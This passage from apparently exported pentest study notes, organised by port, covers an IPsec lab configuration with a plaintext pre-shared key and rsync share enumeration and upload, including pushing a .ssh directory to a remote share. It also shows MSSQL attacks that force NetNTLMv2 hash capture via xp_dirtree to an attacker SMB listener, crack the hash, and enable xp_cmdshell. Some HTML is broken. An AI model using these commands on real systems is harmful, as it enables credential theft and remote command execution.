         style='font-family:Calibri;font-size:11.0pt'>/etc/ipsec.secrets</span></li>
    </ul>
   </ul>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:1.8333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.9597in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Fields Explained</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.6965in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'># This file holds
   shared secrets or RSA private keys for authentication.</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>%any :
   &lt;Authentication Type - Example: PSK&gt; &quot;&lt;VPN Password&gt;&quot;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.9597in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Complete
   /etc/ippsec.secrets file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.6965in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'># This file holds
   shared secrets or RSA private keys for authentication.</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>%any : PSK
   &quot;Dudecake1!&quot;</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>/etc/ipsec.conf</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Values retrieves using
       ike-scan</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:1.8333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5104in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Fields Explained</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.1458in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'># ipsec.conf -
   strongSwan IPsec configuration file</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>config
   setup<br>
      <span style='mso-spacerun:yes'> �
   </span>charondebug=&quot;all&quot;<br>
      # More verbose for troubleshooting connection<br>
      <br>
      <span style='mso-spacerun:yes'>    </span>uniqueids=yes<
      <span style='mso-spacerun:yes'>    </span>strictcrlpolicy=no
p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>conn
   conceal<br>
      <span style='mso-spacerun:yes'>    </span>authby=secret<
      # Auth type.<span style='mso-spacerun:yes'>  </span>PSK = secret
<br>
      <br>
      <span style='mso-spacerun:yes'>    </span>auto=add<
      <span style='mso-spacerun:yes'>    </span>ike=&lt;Value 1&gt
&lt;Value
   2&gt;-&lt;Value 3&gt;!<br>
      # ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;;
   Group=2:&lt;value 3&gt;<br>
      <br>
      <span style='mso-spacerun:yes'>    </span>esp=&lt;Value 1&gt
&lt;Value
   2&gt;!<br>
      # ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;<br>
      <br>
      <span style='mso-spacerun:yes'>    </span>type=transport<
      # ipsec transport mode<br>
      <br>
      <span style='mso-spacerun:yes'>    </span>keyexchange=ikev1<
      # ike-scan value: (IKE CGA version 1) = ikev1<br>
      &nbsp;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>left=&lt;Local Machine IP&g
<br>
      <span style='mso-spacerun:yes'>    </span>right=&lt;Remote M
hine
   IP&gt;<br>
      <span style='mso-spacerun:yes'>    </span>rightsubnet=&lt;Re
te Machine
   IP&gt;[tcp]</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5104in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Complete
   /etc/ipsec.conf file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.1458in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'># ipsec.conf -
   strongSwan IPsec configuration file</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>config setup</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>charondebug=&quot;all&quot;
p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>uniqueids=yes<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>strictcrlpolicy=no<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>conn conceal</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>authby=secret<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>auto=add<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>ike=3des-sha1-modp1024!<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>esp=3des-sha1!<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>type=transport<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>keyexchange=ikev1<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>left=10.10.14.6<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>right=10.10.10.116<
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'>    </span>rightsubnet=10.10.10.116[tc
</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;margin-left:1.875in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;margin-left:1.875in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;margin-left:1.5in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;margin-left:1.125in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3784in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3784in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>636 TCP /
LDAPS</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.2381in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>9:51
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:2.3638in'>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>TCP 636 LDAP SSL
connection</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:9.1645in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.2583in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>837 TCP /
rsync</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.4076in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Thursday,
August 19, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>6:01
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:9.1645in'>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate shared
  folders</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rsync &lt;ip&gt;::</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List files in a
  shared folder</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rysnc
  &lt;ip&gt;::&lt;rsync share&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Download a file
  from remote machine</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rsync
  &lt;ip&gt;::&lt;remote file&gt; &lt;local directory&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Download a
  directory from remote machine</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rsync -r
  &lt;ip&gt;::&lt;remote directory/share&gt; &lt;local directory&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create remote
  directory on local machine</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.0305in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rsync -av
  rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Upload a file to
  remote machine</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rsync ./&lt;local
  file&gt; &lt;ip&gt;::&lt;remote directory&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Upload directory
  to remote machine</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rsync -r
  ./&lt;local directory&gt; &lt;ip&gt;::&lt;remote directory&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.059in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Upload/create
  directory on local machine on remote machine</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9416in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rsync -av ./.ssh
  rsync://192.168.159.126/fox</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.0402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Specify a ssh port
  for rsync if ssh is not running on 22</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rync -a -e
  &quot;ssh -p &lt;port #&gt;&quot; &lt;local directory&gt;
  &lt;user&gt;@&lt;ip&gt;:&lt;directory&gt;</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.4965in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.4965in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>1025 TCP /
msrpc</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.159in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 5, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>2:27
PM</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.9833in'>

<div style='direction:ltr;margin-top:0in;margin-left:.2486in;width:3.3826in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>1433 TCP /
Microsoft SQL</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.2486in;width:2.3333in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Saturday,
April 10, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>10:03
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.9833in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><a
 href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Retrieve mssql service's
      password</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Set listener on
   Kali</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.6479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo responder -I
   tun0</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connect to
   non-existing SMB server from mssql</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.6479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>xp_dirtree '<a
   href="file://%3cip%3e/asd">\\&lt;ip&gt;\asd</a>'</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.493in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Crack the
   NetNTLMv2 output hash on Kali responder</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.6291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>(hashcat -m 5600)</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Log in with
   mssql-svc password retrieved</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7173in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>mssqlclient
   mssql-svc:'&lt;password&gt;'@&lt;ip&gt; -windows-auth</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>impacket-mssqlclient</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.3986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Run shell command
   (with impacket-mssqlclient)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9951in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>xp_cmdshell
   &lt;command&gt;<br>
      &nbsp;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4104in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Run shell command
   (without impacket-mssqlclient)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9833in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXEC xp_cmdshell
   '&lt;command&gt;'; </p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.418in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enable
   xp_cmdshell (without impacket-mssqlclient)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.0451in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXEC sp_configure
   'show advanced options', 1;<br>
      RECONFIGURE;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXEC sp_configure
   'xp_cmdshell', 1;<br>
      RECONFIGURE;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.3986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enable
   xp_cmdshell (with impacket-mssqlclient)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9951in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>enable_xp_cmdshell</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>sqsh</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>append server to
       /etc/freetds/freetds.config</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.3333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9819in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>[&lt;hostname&gt;]</p>
   <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>host
   = &lt;ip&gt;</p>
   <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>port
   = &lt;port #&gt;</p>
   <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>tds
   version = &lt;Examples: 5.0, 7.3, 8.0&gt;</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Commands</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.3333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1562in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Login</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.3875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sqsh -S
   &lt;ip&gt; -U &lt;user&gt; -P &lt;password&gt;<br>
      &lt;ip&gt; can be replaced with hostname if specified in freetds.config
   file</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.175in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>send command</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.2993in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>go (after
   entering command)</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Mssql commands</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Run shell command</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXEC xp_cmdshell
   '&lt;command&gt;'; </p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enable
   xp_cmdshell </p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXEC sp_configure
   'show advanced options', 1;<br>
      RECONFIGURE;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXEC sp_configure
   'xp_cmdshell', 1;<br>
      RECONFIGURE;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1597in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>View databases</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.4868in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SELECT name FROM
   master.dbo.sysdatabases</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Select/use a
   database</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>use &lt;db&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get table names</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SELECT * FROM
   &lt;db name&gt;.INFORMATION_SCHEMA.TABLES;<br>
      (use &lt;db&gt; first)SELECT name FROM sysobjects WHERE xtype = 'U'</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List linked
   servers</p>
   </td>
